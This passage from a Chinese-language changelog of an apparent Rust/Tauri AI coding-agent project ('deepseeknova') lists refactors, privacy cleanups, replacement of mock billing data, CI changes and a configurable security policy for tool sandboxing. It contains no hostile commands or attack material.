- 配置中科大 crates.io 镜像加速

### 代码质量
- 修复 clippy type_complexity 警告（提取 ApprovalSender / ApprovalChannel 类型别名）
- 修复 set_hook 中 event move 后借用错误

### 重构

#### commands.rs 拆分为 17 子模块
- `commands.rs` (1296 行) → `commands/` 目录 (18 个文件, 1372 行)
- 按职责拆分: core/sessions/skills/workspace/sandbox/network/permissions/hooks/mcp/subagents/diagnostics/billing/knowledge/memory/settings/tabs/misc
- `lib.rs` 的 `generate_handler!` 改用完整路径 `commands::module::function`

#### SettingsModal.tsx 拆分为 14 组件
- `SettingsModal.tsx` (898 行) → 主组件 (114 行) + `settings/` 目录 (15 个文件)
- 提取 `Shared.tsx` (SettingRow/StatBox/Toggle) 供所有子组件复用
- 每个设置分区独立文件，平均 50 行

### 安全与隐私修复

#### 数据泄露清理
- `git rm --cached` 移除被意外追踪的 4 个 `.deepseeknova/` 运行时状态文件
- 使用 `git filter-repo` 从全部 Git 历史中彻底清除上述文件（仅 `rm --cached` 不影响历史）
- 删除 `dpronix.toml`（旧项目名残留配置）
- `.gitignore` 规则已覆盖 `.deepseeknova/*`（仅保留 `.deepseeknova/skills/`）

#### 本机路径泄露
- `AGENTS.md` 移除硬编码路径 `/Users/ze/.reasonix/...`（暴露本机用户名和环境结构）
- 精简 AGENTS.md，移除仅适用于原作者本机环境的协议引用

#### Mutex 中毒修复
- `deepseeknova-core/src/memory/store.rs`: 6 处 `Mutex::lock().unwrap()` 改为 `unwrap_or_else(|e| e.into_inner())`
- `deepseeknova-tools/src/memory.rs`: 3 处同上
- 防止一次 panic 后 memory 存储级联崩溃

### Mock 数据修复

#### billing.rs — 接入真实数据
- 不再返回硬编码 JSON，改为从 AppState 的 CumulativeUsage 读取真实 token 统计
- submit_prompt 每次运行结束后累计 usage 到 AppState
- 成本按 DeepSeek 实际定价计算（input $0.27/1M, cached $0.07/1M, output $1.10/1M）
- README 中"命中率 94%+"改为"实时统计命中率"（该数字来自 mock 数据，非真实压测）

#### memory.rs — 接入 core 的 MemoryStore
- 不再使用简化版 JSON 文件存储，改为调用 deepseeknova-core 的 SQLite FTS5 MemoryStore
- 删除 memory_config_path() 和 MemoryEntry struct（desktop 专有）
- get_memories / add_memory / delete_memory 全部走 SQLite，与后端测试覆盖的同一套代码

#### 其他命令 — 标注 mock
- diagnostics.rs: 所有检查项标为 "pending"，明确 "未实际检测"
- knowledge.rs: 返回空数组 + mock: true
- subagents.rs: 返回空数组 + mock: true
- misc.rs check_for_updates: 改为调用 GitHub Releases API 做真实版本检查

### 依赖维护
- 关闭 12 个 Dependabot breaking change PR（opentelemetry-stdout/tracing-opentelemetry 升级导致 trait 不兼容）
- 尝试 workspace dependencies pin 统一依赖版本，因 tonic 0.12 引入的旧版本导致编译失败已回退
- 25 组重复依赖来自 tonic 0.12（opentelemetry-otlp 引入），需等上游升级
- cargo fmt 全格式化

### CI/CD
- 新增 check-desktop job（安装 Tauri 系统依赖 + 前端构建 + cargo check）
- 新增 frontend job（Node 22 + npm ci + npm run build）
- 修复 cargo deny (CDLA-Permissive-2.0 许可证)
- 14 个 CI job 全绿（含三平台 release build）

### README
- 重写自述文件，突出 5 大核心特点
- 新增 ASCII 架构图
- 21 个 crate 一览表
- 移除桌面截图

## [0.3.0] — 2026-07-13

### Security

#### 阻断性修复
- 修复生产路径 `agent.rs` / `coordinator.rs` 创建 `ToolContext` 时缺失 `SecurityContext` 注入，导致运行时所有内置工具调用触发 *"SecurityContext extension not found"* 崩溃的问题
- `Agent` 与 `CoordinatorRunner` 新增 `workspace_root` + `security` 字段，默认 `cwd` + `SecurityContext::with_safe_defaults()`，提供 `with_workspace_root` / `with_security` builder 覆盖
- 两处 ToolContext 生产创建点统一 `.with_workspace(workspace_root).with_extension(security)` 注入

#### 可配置安全策略
- `deepseeknova-config` 新增 `[security]` 配置段：`disabled_capabilities`、`allowed_paths`、`denied_paths`、`allowed_commands`、`allowed_domains`、`limits.*`（max_files/max_file_size/max_total_read_bytes/max_execution_time_secs/max_output_bytes/max_tool_calls），支持分层 merge
- `deepseeknova-runtime` 新增 `build_security_context(config, workspace_root)` 作为安全组装中心；工作区根自动加入 allow-list 首条；`disabled_capabilities` 从全能力集合移除；未设置的限额保留库默认
- `deepseeknova-cli` 的 `build_agent` 与 `CoordinatorRunner` 构建路径调用 `build_security_context` 注入受限策略；`build_agent` 改为返回 `anyhow::Result`

#### 测试
- `deepseeknova-config` 新增 2 个 SecurityConfig merge 测试（默认值保持 + 白名单/限额覆盖）
- `deepseeknova-runtime` 新增 3 个 build_security_context 测试（默认全能力 + 工作区根自动注入、disabled + 命令/域名/路径白名单 + denied_paths、limits.* 覆盖与默认保留）

#### 文档与仓库配置
- ``README.md` 新增「安全」段与 `deepseeknova-security` crate 条目；`CONTRIBUTING.md` 追加 `deepseeknova-security`；`CHANGELOG.md` 新增 `[0.3.0]`
- 新增 `SECURITY.md`（漏洞披露与响应流程）；新增 `CODEOWNERS`

## [0.2.0] — 2026-07-12

### Added
- Initial workspace structure with 21 crates
- Core types: Runner/Tool traits, WireEvent, RunInput
- Agent loop with streaming and tool use
- DeepSeek provider with reasoning effort support
- TUI (ratatui) and CLI (clap) frontends
- axum HTTP server with SSE streaming
- MCP client (stdio + HTTP)
- Sandbox (Seatbelt + bubblewrap)
- Permission gate (allow/ask/deny)
- Session store (JSONL + rotation)
- Skill loader (.deepseeknova/skills)
- OpenTelemetry integration
- File checkpoint/rollback
- GOAP planner + swarm coordination
- Tauri 2.0 desktop app scaffolding

## [0.1.0] — 2026-07-10

- Initial release
